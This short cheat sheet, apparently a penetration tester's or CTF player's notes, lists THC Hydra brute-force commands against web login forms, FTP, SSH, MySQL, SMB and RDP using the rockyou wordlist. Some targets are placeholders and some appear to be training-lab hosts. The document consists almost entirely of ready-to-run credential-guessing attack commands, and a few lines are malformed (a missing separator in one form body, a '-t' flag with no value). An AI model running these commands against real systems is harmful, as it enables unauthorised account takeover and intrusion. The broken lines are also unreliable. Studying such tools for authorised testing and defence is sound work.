## Brute Force THCHydra

https://en.kali.tools/?p=220

# HTTP Post Web Form

$ hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "<Login Page>:<Request Body>:<Error Message>"

$ hydra -l admin -P /dir/passlist.txt www.onlineshop.thm http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V

$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.12.183 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."

$hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.4.149 http-post-form "/admin/:user=^USER^&pass=^PASS^login=Login:Username or password invalid"

$ hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"

# FTP

$ hydra -l user-name -P /dir/passlist.txt <IP Address> ftp

$ hydra -L /dir/users.txt -P /dir/passlist.txt ftp://<IP_Address>

# SSH

$ hydra -l <username> -P <full path to passlist.txt> <IP Address Target> -t 4 ssh

$ hydra -L <full path to usernamelist.txt> -P <full path to passlist.txt> ssh://IP_Address:22

$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt <IP Address Target> -t 4 ssh

$ ssh username@<IP Address>

# MySQL

$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt <IP Address Target> -t mysql

# SMB

$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt <IP Address Target> -t 4 smb

# RDP
$ hydra -l <username> -P <full path to passlist.txt> <IP Address> rdp

$ hydra -L <full path to usernamelist.txt> -P <full path to passlist.txt> -t 4 -W 3 rdp://IP_Address:3389/
